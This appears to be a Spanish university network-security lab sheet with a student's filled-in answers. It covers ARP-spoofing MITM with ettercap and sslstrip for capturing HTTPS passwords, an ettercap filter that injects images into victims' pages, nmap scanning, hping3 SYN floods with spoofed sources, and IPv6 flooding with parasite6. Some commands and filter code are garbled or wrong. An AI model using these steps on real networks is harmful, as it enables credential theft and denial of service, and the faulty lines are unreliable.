                                                                     
                                                                     
                                                                     
                                             
Práctica II.: Ejemplos de categorías de ataque et al. (3 sesiones – 6h)
Prof. A. Santos del Riego
Legislación y Seguridad Informática (LSI)
Facultad de Informática. Universidade da Coruña
Fecha propuesta.: enero 2003
Última revisión.: julio 2012



El objetivo de esta práctica es comprender y probar el funcionamiento de los sniffers, los
ataques [D]DoS, así como diversos temas relacionados con lo que hemos llamado la
trilogía (“host discovery”, “port scanning” y “fingerprinting”). En las sesiones prácticas se
propondrán posibles herramientas a utilizar.


Extenso manual de ETTERCAP:
http://www.irongeek.com/i.php?page=backtrack-3-man/ettercap

a)   Instale el ettercap y pruebe sus opciones básicas en línea de comando.

	$ sudo apt-get install ettercap
	$ ettercap -help
	ettercap NG-0.7.4.2 copyright 2001-2005 ALoR & NaGA


Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]

TARGET is in the format MAC/IPs/PORTs (see the man for further detail)

Sniffing and Attack options:
  -M, --mitm <METHOD:ARGS>    perform a mitm attack
  -o, --only-mitm             don't sniff, only perform the mitm attack
  -B, --bridge <IFACE>        use bridged sniff (needs 2 ifaces)
  -p, --nopromisc             do not put the iface in promisc mode
  -u, --unoffensive           do not forward packets
  -r, --read <file>           read data from pcapfile <file>
  -f, --pcapfilter <string>   set the pcap filter <string>
  -R, --reversed              use reversed TARGET matching
  -t, --proto <proto>         sniff only this proto (default is all)

User Interface Type:
  -T, --text                  use text only UI
       -q, --quiet                 do not display packet contents
       -s, --script <CMD>          issue these commands to the GUI
  -C, --curses                use curses UI
  -D, --daemon                daemonize ettercap (no UI)

Logging options:
  -w, --write <file>          write sniffed data to pcapfile <file>
  -L, --log <logfile>         log all the traffic to this <logfile>
  -l, --log-info <logfile>    log only passive infos to this <logfile>
  -m, --log-msg <logfile>     log all the messages to this <logfile>
  -c, --compress              use gzip compression on log files

Visualization options:
  -d, --dns                   resolves ip addresses into hostnames
  -V, --visual <format>       set the visualization format
  -e, --regex <regex>         visualize only packets matching this regex
  -E, --ext-headers           print extended header for every pck
  -Q, --superquiet            do not display user and password

General options:
  -i, --iface <iface>         use this network interface
  -I, --iflist                show all the network interfaces
  -n, --netmask <netmask>     force this <netmask> on iface
  -A, --address <address>     force this local <address> on iface
  -P, --plugin <plugin>       launch this <plugin>
  -F, --filter <file>         load the filter <file> (content filter)
  -z, --silent                do not perform the initial ARP scan
  -j, --load-hosts <file>     load the hosts list from <file>
  -k, --save-hosts <file>     save the hosts list to <file>
  -W, --wep-key <wkey>        use this wep key to decrypt wifi packets
  -a, --config <config>       use the alterative config file <config>

Standard options:
  -v, --version               prints the version and exit
  -h, --help                  this help screen

	
b)   Capture paquetería de una sesión no segura.
	
	Abrir ettercap:
		sudo ettercap -G
	
	Escoger la interfaz donde se va a esnifaz el trafico:
		Sniff + Unified Sniffing + eth0(en el caso de las maquinas de los laboratorios)
		
	Averiguar los hosts disponibles para el ataque:
		Hosts + scan for hosts
		Hosts + hosts list
		
	Escoger a una victima:
		Buscar la puerta de enlace y darle a Add to Target 1(en caso de las maquinas de los laboratorios 10.10.102.5)
		Escoger la ip de la victima y darle a Add to Target 2
		
	Comenzar el ARP Spoofing:
		Mitm + arp poisoning + Sniff remote connections
		
	Comenzar a esnifar el trafico:
		Start + Start sniffing
	
	Para ver las conexiones:
		View + Connections
	
	
	PASOS PREVIOS:
		echo "1" > /proc/sys/net/ipv4/ip_forward
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <puerto_de_escucha>
		cd /ruta/de/sslstrip
		python sslstrip.py -l <puerto_de_escucha>

c)   Capture un paquete TCP e identifique los principales campos de cabecera.
	
	wireshark
	
	0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|     Puerto de origen          |      Puerto de destino        |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                     Número de secuencia                       |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                   Número de acuse de recibo                   |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	| Posic |           |U|A|P|R|S|F|                               |
	| de los| Reservado |R|C|S|S|Y|I|           Ventana             |
	| datos |           |G|K|H|T|N|N|                               |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|       Suma de control         |        Puntero urgente        |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                    Opciones                   |    Relleno    |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                            Datos                              |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


d)   Capture un paquete IPv6 e identifique los principales campos de cabecera.

	wireshark + ping6

e)   Indique 3 servicios que transmiten información en claro y otros 3 cifrada.

	Cifrada: ssh, https, sftp
	Claro: telnet, http, ftp

f)   Obtenga la relación de las direcciones MAC de los equipos de su segmento.
	
	nmap -sP 10.10.102.0/24

g)   Obtenga la relación de las direcciones IPv6 de su segmento.
	
	¿¿¿¿nmap -sP -6 ::10.10.102.0/24???? 
	¿¿¿¿nmap -Pn -6 ::10.10.102.0/24????

h)   Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio
     obtenga todas las URL HTTP visitadas por la víctima. Trate de visualizarlas
     directamente en su navegador.
     
     Cambios en el fichero de configuracion (/etc/etter.conf):
     	[privs]
	ec_uid = 0                # nobody is the default
	ec_gid = 0                # nobody is the default
	
     # the command used by the remote_browser plugin
	remote_browser = "firefox -new-tab http://%host%url"

     Procedimiento:
     	Igual al de sslstrip + (plugins + remote_browser)

     
i)   Haga un MITM en IPv6 y visualice la paquetería.
	echo 1 > /proc/sys/net/ipv6/conf/all/forwarding + 
	parasite6(parasite6 -l eh0) + 
	wireskark
		
	
j)   Utilizando un filtro ettercap modifique las imágenes de las páginas http visitadas
     por una determinada máquina del laboratorio.

	if (ip.proto == TCP && tcp.dst == 80) {
		if (search(DATA.data, "Accept-Enconding")){
			replace("Accept-Enconding", "Accept-Rubbish!");
	#note:
			mag("zappet Accept-Enconding!\n");
		}
	}

	if (ip.proto == TCP && top.arc ==80) {
	 	replace ("img arc"),"img arc\"url,de una imagen\""); 
	 	replace("IMG SRC=", "img src=\"URL de una imagen\" ");
		msg("Filter Ran. \n");
	}

	
	Se almacena en filtro.filter
	ettercap filtro.filter -i filtro.ef
	
	Se hace todo el procedimiento como para robar un password en https y se aplica el filtro al final de todo
     
     
k)   Utilizando el ettercap-gtk trate de capturar el password de una sesión https.

	Abrir ettercap:
		sudo ettercap -G
	
	Escoger la interfaz donde se va a esnifaz el trafico:
		Sniff + Unified Sniffing + eth0(en el caso de las maquinas de los laboratorios)
		
	Averiguar los hosts disponibles para el ataque:
		Hosts + scan for hosts
		Hosts + hosts list
		
	Escoger a una victima:
		Buscar la puerta de enlace y darle a Add to Target 1(en caso de las maquinas de los laboratorios 10.10.102.5)
		Escoger la ip de la victima y darle a Add to Target 2
		
	Comenzar el ARP Spoofing:
		Mitm + arp poisoning + Sniff remote connections
		
	Comenzar a esnifar el trafico:
		Start + Start sniffing
	
	Para ver las conexiones:
		View + Connections
	
	
	PASOS PREVIOS:
		echo "1" > /proc/sys/net/ipv4/ip_forward
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <puerto_de_escucha>
		cd /ruta/de/sslstrip
		python sslstrip.py -l <puerto_de_escucha>

l)   Pruebe alguna herramienta y técnica de detección del sniffing.
	Ettercap + plugins + scan promisc | scan_poisonin


m) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las
   máquinas del laboratorio de prácticas.
   	 Pruebas de Host Discovery:
		nmap -sL 10.10.102.0/24

    	Pruebas de Port Scanning:
    		nmap -sP 10.10.102.171
		nmap -sP -p 1-65535 10.10.102.0/24
		

    	pruebas de Os Fingerprinting:
		nmap -A 10.10.102.0/24 		 
		nmap -O 10.10.102.0/24
		
   
n) Realice alguna de las pruebas de port scanning del apartado anterior sobre IPv6.
   ¿Coinciden los servicios prestados por un sistema con los de IPv4?.
   	nmap -6 -sP 10.10.102.170
   	nmap -sP 10.10.102.170
   	
   	La de ipv6 da menos servicios porque es mas moderno y la mayoria de servicios no estan implementados en esta tecnologia
   	
   
o) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como
   del ancho de banda consumido en cada una de ellas. Establezca un sistema de
   accounting del subsistema de red de su máquina de laboratorio.
   	iftop - iftop -i eth0
   	¿¿¿¿¿¿¿¿¿¿¿¿ACCOUNTING?????????????????
   
p) Seleccione alguna máquina de laboratorio de cualquier compañero de clase como
   objetivo y, pensando en una DoS de tipo direct attack, haga las pruebas que estime
   oportunas. Repita la jugada pero pesando en una DoS de tipo reflective flooding attack.
   Trate de visualizar en todo momento las conexiones y, o, paquetería generada.
   	apt-get install hping3
   
	hping3 -p 80  -S --flood ip_victima
	-p 80 es el puerto que elegimos atacar
	-S activa el flag Syn
	--flood le indica a hping que envie los paquetes a la máxima velocidad posible
	ip_victima es la ip o dominio a atacar
	hping3 -a ip_falsa -p 80  -S --flood ip_victima
	utilizar --rand-source con lo que se generan direcciones de origen ip al azar
   	wireshark
   	
   	hping3 --rand-source –SA –p <open port> <target IP>
   	wireshark
   	¿¿¿¿DIFERENCIAS?????
   
q) Considerando que todos los sistemas del laboratorio tiene autoconfiguración de la pila
   IPv6, ¿cómo podría tratar de tirar abajo todos los sistemas? Haga también pruebas de
   flooding en IPv6. ¿Cómo podríamos protegernos?.
   
   	alive6 interfaz -> para saber las maquinas disponibles para el ataque
   	
   	parasite6 interfaz -> sin activar lo de ip forwarding
	Remember to enable routing (ip_forwarding), you will denial service otherwise!
	Started ICMP6 Neighbor Solitication Interceptor (Press Control­C to end) ...
   	Defensa: tabla de arp estatica
   	
   	
   	
r) Ataque un servidor apache para provocarle un DoS. ¿Cómo podría proteger dicho
   servicio ante este tipo de ataque? ¿Y si se produce desde fuera de su segmento de red?
   ¿Cómo podría tratar de saltarse dicha protección?
   
   	¿¿¿¿http://systemadmin.es/2009/08/slowloris-ataque-de-denegacion-de-servicio-para-apache-1x-y-2x????
   	
   	http://tecnogets.com/10-consejos-para-proteger-el-servidor-web-apache-en-unix-linux
	-No enviar la versión de Apache
	-Limitar X número de conexiones en un intervalo X de tiempo
   

Método de evaluación.: Como resultado de esta práctica, el profesor evaluará las
habilidades adquiridas por el alumno mediante una sesión de trabajo en máquina.
